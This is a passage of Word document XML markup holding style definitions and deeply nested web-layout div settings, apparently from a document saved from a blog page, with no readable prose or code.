      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="categories">
    <w:name w:val="categories"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="tags">
    <w:name w:val="tags"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="008274A1"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLCite">
    <w:name w:val="HTML Cite"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008274A1"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="says">
    <w:name w:val="says"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00827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4A1"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="001A4FDA"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A821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A821AF"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A821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A821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74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74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74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4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74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74A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274A1"/>
    <w:rPr>
      <w:color w:val="0000FF"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="NormalWeb">
    <w:name w:val="Normal (Web)"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008274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count">
    <w:name w:val="share-count"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Date1">
    <w:name w:val="Date1"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="entry-date">
    <w:name w:val="entry-date"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="author">
    <w:name w:val="author"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="HTMLPreformatted">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HTMLPreformattedChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0082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74A1"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="categories">
    <w:name w:val="categories"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="tags">
    <w:name w:val="tags"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="character" w:styleId="Emphasis">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:rsid w:val="008274A1"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTMLCite">
    <w:name w:val="HTML Cite"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="008274A1"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="says">
    <w:name w:val="says"/>
    <w:basedOn w:val="DefaultParagraphFont"/>
    <w:rsid w:val="008274A1"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="BalloonText">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="BalloonTextChar"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00827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4A1"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:sz w:val="16"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="ListParagraph">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normal"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="001A4FDA"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Header">
    <w:name w:val="header"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="HeaderChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A821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A821AF"/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Footer">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normal"/>
    <w:link w:val="FooterChar"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A821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A82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763102">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
      <w:divsChild>
        <w:div w:id="64034101">
          <w:marLeft w:val="0"/>
          <w:marRight w:val="0"/>
          <w:marTop w:val="0"/>
          <w:marBottom w:val="0"/>
          <w:divBdr>
            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
          </w:divBdr>
          <w:divsChild>
            <w:div w:id="1869828001">
              <w:marLeft w:val="0"/>
              <w:marRight w:val="0"/>
              <w:marTop w:val="0"/>
              <w:marBottom w:val="0"/>
              <w:divBdr>
                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
              </w:divBdr>
              <w:divsChild>
                <w:div w:id="186988647">
                  <w:marLeft w:val="0"/>
                  <w:marRight w:val="0"/>
                  <w:marTop w:val="0"/>
                  <w:marBottom w:val="0"/>
                  <w:divBdr>
                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                  </w:divBdr>
                  <w:divsChild>
                    <w:div w:id="1548833578">
                      <w:marLeft w:val="0"/>
                      <w:marRight w:val="0"/>
                      <w:marTop w:val="0"/>
                      <w:marBottom w:val="0"/>
                      <w:divBdr>
                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                      </w:divBdr>
                      <w:divsChild>
                        <w:div w:id="65692795">
                          <w:marLeft w:val="0"/>
                          <w:marRight w:val="0"/>
                          <w:marTop w:val="0"/>
                          <w:marBottom w:val="0"/>
                          <w:divBdr>
                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                          </w:divBdr>
                          <w:divsChild>
                            <w:div w:id="234245079">
                              <w:marLeft w:val="0"/>
                              <w:marRight w:val="0"/>
                              <w:marTop w:val="0"/>
                              <w:marBottom w:val="0"/>
                              <w:divBdr>
                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                              </w:divBdr>
                              <w:divsChild>
                                <w:div w:id="496655163">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="882055471">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="1676029886">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="217866393">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="1493177713">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                              </w:divsChild>
                                            </w:div>
                                            <w:div w:id="1005981675">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="1412312756">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1454977451">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1911574416">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1845893816">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="644623486">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1747458002">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1686858055">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1811240653">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="469250038">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="223682032">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="1980105800">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="1849247218">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                      <w:divsChild>
                                                        <w:div w:id="8809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6256">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="11280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348">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="12145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731656">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="2019115898">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="567688459">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="250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1266">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="316493189">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="406995456">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="614794621">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="1235361282">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                  <w:divsChild>
                                                    <w:div w:id="1837501242">
                                                      <w:marLeft w:val="0"/>
                                                      <w:marRight w:val="0"/>
                                                      <w:marTop w:val="0"/>
                                                      <w:marBottom w:val="0"/>
                                                      <w:divBdr>
                                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                      </w:divBdr>
                                                    </w:div>
                                                  </w:divsChild>
                                                </w:div>
                                                <w:div w:id="814444625">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                  </w:divBdr>
                                                </w:div>
                                                <w:div w:id="3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063690">
                                  <w:marLeft w:val="0"/>
                                  <w:marRight w:val="0"/>
                                  <w:marTop w:val="0"/>
                                  <w:marBottom w:val="0"/>
                                  <w:divBdr>
                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                    <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                  </w:divBdr>
                                  <w:divsChild>
                                    <w:div w:id="844126250">
                                      <w:marLeft w:val="0"/>
                                      <w:marRight w:val="0"/>
                                      <w:marTop w:val="0"/>
                                      <w:marBottom w:val="0"/>
                                      <w:divBdr>
                                        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                      </w:divBdr>
                                      <w:divsChild>
                                        <w:div w:id="745035600">
                                          <w:marLeft w:val="0"/>
                                          <w:marRight w:val="0"/>
                                          <w:marTop w:val="0"/>
                                          <w:marBottom w:val="0"/>
                                          <w:divBdr>
                                            <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                            <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                          </w:divBdr>
                                          <w:divsChild>
                                            <w:div w:id="1861891554">
                                              <w:marLeft w:val="0"/>
                                              <w:marRight w:val="0"/>
                                              <w:marTop w:val="0"/>
                                              <w:marBottom w:val="0"/>
                                              <w:divBdr>
                                                <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                                <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
                                              </w:divBdr>
                                              <w:divsChild>
                                                <w:div w:id="946733266">
                                                  <w:marLeft w:val="0"/>
                                                  <w:marRight w:val="0"/>
                                                  <w:marTop w:val="0"/>
                                                  <w:marBottom w:val="0"/>
                                                  <w:divBdr>
                                                    <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
